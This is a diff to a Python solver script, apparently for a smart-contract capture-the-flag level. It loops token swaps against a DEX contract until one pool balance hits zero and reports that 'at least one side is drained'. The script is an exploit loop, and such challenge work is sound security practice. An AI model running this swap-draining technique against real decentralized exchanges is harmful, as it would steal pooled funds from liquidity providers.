@@ -38,23 +38,24 @@ def solve_challenge(locally=False):
         my_bal = dex.balanceOf(switch[c][1], acc.address)
 
         # function to check balances
-        dex_bal1 = lambda: dex.balanceOf(switch[c][1], dex.address)
-        dex_bal2 = lambda: dex.balanceOf(switch[c][2], dex.address)
+        dex_bal1 = lambda c: dex.balanceOf(switch[c][1], dex.address)
+        dex_bal2 = lambda c: dex.balanceOf(switch[c][2], dex.address)
+        print(f'balances: TK1: {dex_bal1(True)} TK2: {dex_bal2(True)}')
 
         # perform action
-        if (my_bal < dex_bal1()):
+        if (my_bal < dex_bal1(c)):
             dex.swap(switch[c][1], switch[c][2], my_bal, _from)
         else:
-            dex.swap(switch[c][1], switch[c][2], dex_bal1(), _from)
+            dex.swap(switch[c][1], switch[c][2], dex_bal1(c), _from)
         
         # check if we are done
-        if dex_bal1() == 0 or dex_bal2() == 0:
+        if dex_bal1(c) == 0 or dex_bal2(c) == 0:
             break
 
     # check that we have effectively drained at least one of the tokens
-    balance_assertion = (dex.balanceOf(tk1, dex.address) == 0) or (dex.balanceOf(tk2, dex.address) == 0)
-    print(f"Token1 balance: {dex.balanceOf(tk1,dex.address)}")
-    print(f"Token2 balance: {dex.balanceOf(tk2,dex.address)}")
+    balance_assertion = (dex_bal1(True) == 0) or (dex_bal2(True) == 0)
+    print(f"Token1 balance: {dex_bal1(True)}")
+    print(f"Token2 balance: {dex_bal2(True)}")
     print(f"at least one side is drained: {balance_assertion}")
 
     return balance_assertion
